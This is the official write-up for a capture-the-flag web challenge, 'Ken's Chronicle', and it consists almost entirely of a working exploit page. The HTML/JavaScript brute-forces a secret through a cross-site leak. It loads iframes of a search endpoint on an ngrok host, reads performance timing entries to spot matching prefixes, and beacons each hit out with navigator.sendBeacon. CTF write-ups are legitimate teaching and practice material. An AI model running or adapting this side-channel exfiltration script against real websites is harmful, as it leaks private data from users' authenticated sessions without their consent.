Links: [Challenge](https://chall.notepad2.gq/) | [Bot](http://web.challenge.bi0s.in:1337/)

Author: [Az3z3l](https://twitter.com/Az3z3l)

[kenschronicle.zip](./kenschronicle.zip)

**Official WriteUp**

```html
<html>
    <head>
        <title>Exploit - Ken's Chronicle</title>
    </head>

    <body>

    </body>
    <script>
        async function run() {
            startsWith = window.location.search.substring(1);


            characterSet = "abcdefghijklmno"
            characterSet += "pqrstuvwxyz_{}"


            for (var j = 0; j < characterSet.length; j++){
                bf = startsWith + characterSet[j]
                url = `https://7649ac48b82b.ngrok.io/find?startsWith=${bf}&debug&Timing-Allow-Origin=*`
                
                var iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.onload = "alert()"
                document.body.appendChild(iframe);

            }
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function checker(){
            list = window.performance.getEntriesByType("resource");
            console.log(list)
            for (i=0; i<list.length; i++){
                curr = list[i]
                if (curr.nextHopProtocol == ""){
                    try {
                        navigator.sendBeacon(`?flag=${curr.name.split("startsWith=")[1].split("&")[0]}`)
                    } catch (error) {
                        console.log(error)
                    }
                }
            }
        }

        async function doit() {
            run()
            await sleep(10000);
            checker()
        }
        doit()
    </script>


</html>
```